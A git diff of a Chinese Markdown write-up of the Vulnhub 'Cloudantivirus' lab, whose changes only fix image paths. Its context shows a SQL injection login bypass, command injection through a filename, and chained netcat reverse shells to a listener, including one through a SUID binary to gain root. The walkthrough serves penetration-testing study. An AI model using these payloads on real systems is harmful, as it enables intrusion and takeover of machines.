@@ -1,4 +1,4 @@
-﻿---
+---
 title: Chapter2_Easy_Cloudantivirus
 categories:
 - Network_Security
@@ -7,7 +7,6 @@ categories:
 tags:
 - Network_Security
 - Vulnhub
-date: 2024-04-05 13:32:28
 ---
 
 # Cloudantivirus 记录
@@ -26,25 +25,25 @@ date: 2024-04-05 13:32:28
 
 2. 端口扫描：
     `sudo nmap -Pn -sV 192.168.0.104 -p 1-65535`
-    ![image-20240112141214011](image-20240112141214011.png)
+    ![image-20240112141214011](Chapter2_Easy_Cloudantivirus/image-20240112141214011.png)
 
 3. 目录爆破
     `dirsearch -u http://192.168.0.104:8080/`
-    ![image-20240112142933497](image-20240112142933497.png)
+    ![image-20240112142933497](Chapter2_Easy_Cloudantivirus/image-20240112142933497.png)
     访问了之后，没啥可利用的页面
 
 4. burp fuzz 一下特殊符号，看看异常：
 
-    ![image-20240112142910986](image-20240112142910986.png)
+    ![image-20240112142910986](Chapter2_Easy_Cloudantivirus/image-20240112142910986.png)
     发现 `"` 异常厉害，着重关注一下。
 
 ### 1.2 打点
 
 1. 发现 SQL 注入，万能密码开梭 `1" or 1=1 -- -`，进入系统：
-    ![image-20240112144303351](image-20240112144303351.png)
+    ![image-20240112144303351](Chapter2_Easy_Cloudantivirus/image-20240112144303351.png)
 
 2. 猜测是命令执行漏洞，逻辑是 `./扫描程序 文件名`，先用 `hello | id` 检测：
-    ![image-20240112145302878](image-20240112145302878.png)
+    ![image-20240112145302878](Chapter2_Easy_Cloudantivirus/image-20240112145302878.png)
     验证成功，确实是。
 
 ### 1.3 反弹 Shell
@@ -62,7 +61,7 @@ date: 2024-04-05 13:32:28
 2. NC 串联：
     `hello | /bin/nc 192.168.0.2 4444 | /bin/bash | /bin/nc 192.168.0.2 5555 # nc 串联，使用 | 将结果向后传递。`
     创建两个监听端口后，4444 端输入的内容会在靶机的 /bin/bash 下执行，（由于管道符 `|`)，结果会发送到 5555 端：
-    ![image-20240112151651716](image-20240112151651716.png)
+    ![image-20240112151651716](Chapter2_Easy_Cloudantivirus/image-20240112151651716.png)
 
 ### 1.4 内部的信息收集与提权
 
@@ -94,7 +93,7 @@ date: 2024-04-05 13:32:28
     结果没用。
 
 3. 放弃，从其他的角度寻找提权的方式，再进行信息收集，查看文件，结果在上级文件夹下，存在文件：
-    ![image-20240112155614433](image-20240112155614433.png)
+    ![image-20240112155614433](Chapter2_Easy_Cloudantivirus/image-20240112155614433.png)
     update_cloudav 符合 suid 提权条件：
 
     > https://blog.csdn.net/lv8549510/article/details/85406215
@@ -105,13 +104,13 @@ date: 2024-04-05 13:32:28
     update_cloudav 文件应该是 update_cloudav.c 的二进制文件。
 
 4. 查看更新文件的源码：
-    ![image-20240112160113060](image-20240112160113060.png)
+    ![image-20240112160113060](Chapter2_Easy_Cloudantivirus/image-20240112160113060.png)
     大概分析一下：`command` 变量为命令执行的语句，该命令调用了 `freshclam`（Clamav) 的程序，其中要求添加一个参数。
     再次构建 payload（参数中执行命令)：
     `./update_cloudav "a | nc 192.168.0.2 6666 | /bin/bash | nc 192.168.0.2 7777"`
 
 5. 至此，提权结束：
-    ![image-20240112160749970](image-20240112160749970.png)
+    ![image-20240112160749970](Chapter2_Easy_Cloudantivirus/image-20240112160749970.png)
 
 ## 2. 知识点总结
 
